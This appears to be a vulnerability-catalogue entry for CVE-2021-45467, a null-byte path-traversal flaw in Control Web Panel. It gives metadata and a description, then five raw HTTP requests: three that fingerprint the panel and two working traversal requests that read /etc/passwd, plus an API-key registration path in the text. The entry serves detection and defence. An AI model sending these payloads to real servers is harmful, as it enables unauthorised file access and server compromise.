---
layout: post
cve_id: CVE-2021-45467
title: Control Web Panel (CWP) - File Inclusion
pcap: true
pcap_path: /pcaps/2021/CVE-2021-45467.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-45467.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'A remote, unauthenticated attacker can leverage this vulnerability to register
  arbitrary API keys, access sensitive files (such as /etc/passwd), and potentially
  achieve remote code execution. Successful exploitation results in full compromise
  of the web panel and host system, allowing for exposure of confidential data, server
  takeover, and further attacks on internal infrastructure.

  '
remediation: 'Update to version 0.9.8.1107 or later to fix input validation issues.

  '
reference:
- https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/
- https://nvd.nist.gov/vuln/detail/CVE-2021-45467
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-45467
  epss-score: 0.85048
  epss-percentile: 0.99315
  cwe-id: CWE-862
  cpe: cpe:2.3:a:control-webpanel:webpanel:*:*:*:*:*:*:*:*
metadata:
  verified: false
  max-request: 5
  vendor: control_webpanel
  product: webpanel
  fofa-query: icon_hash="-356182173"
tags:
- cve
- cve2021
- cwp
- rce
- lfi
- centos
- webpanel
- vkev
---

## üîç Vulnerability Description
In CWP (Control Web Panel, previously CentOS Web Panel) before version 0.9.8.1107, an unauthenticated attacker can abuse null byte (%00) injection with the "scripts" parameter in the /user/loader.php or /user/login.php endpoints to register arbitrary API keys or access sensitive files. This can be exploited by using multiple %00 sequences to traverse directories via crafted requests such as /user/loader.php?api=1&scripts=.%00./.%00./api/account_new_create&acc=guadaapi, or similar payloads with more %00 instances (e.g., .%00%00%00./.%00%00%00./api/account_new_create). Attackers may use this flaw for arbitrary file access, privilege escalation, or remote code execution.


## üåê HTTP Request
```nohighlight
GET /login/cwp_theme/original/img/ico/favicon.ico HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /login/design/img/ico/favicon.ico HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /user/index.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /user/login.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

